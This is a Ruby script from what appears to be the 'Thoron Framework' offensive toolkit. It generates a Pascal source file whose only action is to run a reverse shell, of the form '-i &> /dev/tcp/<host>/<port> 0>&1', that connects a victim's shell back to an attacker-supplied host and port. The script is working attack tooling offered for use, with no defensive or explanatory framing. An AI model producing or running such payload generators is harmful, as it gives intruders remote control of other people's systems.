#!/usr/bin/env ruby

#            ---------------------------------------------------
#                             Thoron Framework                                
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

e = "\033[1;31m[-] \033[0m"
p = "\033[1;77m[>] \033[0m"
g = "\033[1;34m[*] \033[0m"
s = "\033[1;32m[+] \033[0m"
h = "\033[1;77m[@] \033[0m"
r = "\033[1;77m[#] \033[0m"

require 'optparse'
require 'ostruct'

options = OpenStruct.new
OptionParser.new do |opt|
  opt.on('-h', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
  opt.on('-p', '--local-port <local_port>', 'Local port.') { |o| options.local_port = o }
  opt.on('-s', '--target-shell <target_shell>', 'Target shell.') { |o| options.target_shell = o }
  opt.on('-o', '--output-path <output_path>', 'Output path.') { |o| options.output_path = o }
end.parse!

host = options.local_host
port = options.local_port
shell = options.target_shell
file = options.output_path

if host == "" or port == "" or shell == "" or file == ""
    puts "Usage: pascal.rb --local-host=<local_host> --local-port=<local_port>"
    puts "                 --target-shell=<target_shell> --output-path=<output_path>"
    puts ""
    puts "  --local-host=<local_host>      Local host."
    puts "  --local-port=<local_port>      Local port."
    puts "  --target-shell=<target_shell>  Target shell."
    puts "  --output-path=<output_path>    Output path."
end
  
w = ENV['OLDPWD']
Dir.chdir(w)
if File.directory? file
    if File.exists? file
        if file[-1] == "/"
            file = "#{file}payload.pas"
            sleep(0.5)
            puts "#{g}Generating payload..."
            sleep(1)
            puts "#{g}Saving to #{file}..."
            sleep(0.5)
            open(file, 'w') { |f|
                f.puts "begin"
		f.puts "    Exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
        	f.puts "end."
            }
            puts "#{s}Saved to #{file}!"
        else
            file = "#{file}/payload.pas"
            sleep(0.5)
            puts "#{g}Generating payload..."
            sleep(1)
            puts "#{g}Saving to #{file}..."
            sleep(0.5)
            open(file, 'w') { |f|
                f.puts "begin"
		f.puts "    Exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
        	f.puts "end."
            }
            puts "#{s}Saved to #{file}!"
        end
    else
        puts "#{e}Output directory: #{file}: does not exist!"
        abort()
    end
else
    direct = File.dirname(file)
    if direct == ""
        direct = "."
    else
        nil
    end
    if File.exists? direct
        if File.directory? direct
            sleep(0.5)
            puts "#{g}Generating payload..."
            sleep(1)
            puts "#{g}Saving to #{file}..."
            sleep(0.5)
            open(file, 'w') { |f|
                f.puts "begin"
		f.puts "    Exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
        	f.puts "end."
            }
            puts "#{s}Saved to #{file}!"
        else
            puts "#{e}Error: #{direct}: not a directory!"
            abort()
        end
    else
        puts "#{e}Output directory: #{direct}: does not exist!"
        abort()
    end
end
